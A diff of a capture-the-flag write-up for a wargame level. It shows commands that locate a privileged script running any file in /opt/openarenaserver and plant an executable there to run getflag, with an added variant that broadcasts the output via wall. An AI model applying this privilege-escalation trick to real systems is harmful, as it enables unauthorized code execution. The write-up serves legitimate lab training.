@@ -1,5 +1,3 @@
-# find a clue
-
 The command ```find / -group level05 2>/dev/null``` lists nothing of interest but the command :
 ```find / -group flag05 2>/dev/null``` get this results :
 /usr/sbin/openarenaserver
@@ -38,3 +36,5 @@ This script execute any file in /opt/openarenaserver then delete it
 we create a file in this directory that executes getflag ```echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/getflag```
 we add permission to be executed : ```chmod +x /opt/openarenaserver/getflag```
 after waiting 2 minutes the file /tmp/flag contains our flag : ```cat /tmp/flag```
+
+This method can be refined with the command ```echo "/bin/getflag | wall``` as now all users get the getflag message
